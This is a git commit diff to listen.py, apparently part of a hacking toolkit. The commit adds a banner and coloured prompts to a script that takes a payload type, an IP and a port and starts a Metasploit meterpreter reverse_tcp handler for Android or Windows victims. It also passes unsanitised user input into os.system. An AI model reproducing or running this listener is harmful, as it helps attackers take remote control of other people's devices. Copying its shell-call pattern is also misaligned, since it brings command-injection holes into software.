f1116c84d76e5b30358d1f26cc34008062657265
Mano99mano <90122109+Mano99mano@users.noreply.github.com>
2021-10-03 08:03:10 +0000

    Update listen.py

--- listen.py
+++ listen.py
@@ -1,7 +1,16 @@
 import os
+logo = '''
+\033[1;36m███╗░░░███╗░█████╗░███╗░░██╗░█████╗░
+████╗░████║██╔══██╗████╗░██║██╔══██╗
+██╔████╔██║███████║██╔██╗██║██║░░██║
+██║╚██╔╝██║██╔══██║██║╚████║██║░░██║
+██║░╚═╝░██║██║░░██║██║░╚███║╚█████╔╝
+╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░
+'''
+print (logo)
 os.system("clear")
-payload = input("Payload type to listen hem windows or android ? ")
+payload = input("\033[1;31mPAYLOAD TYPE ANDROID / WINDOWS : ")
 os.system("ifconfig")
-ip = input("Your ip ? ")
-port = input("Your port ? ")
+ip = input("\033[1;34m[===>] YOUR IP :  ")
+port = input("\033[1;33m[===>] PORT ")
 os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
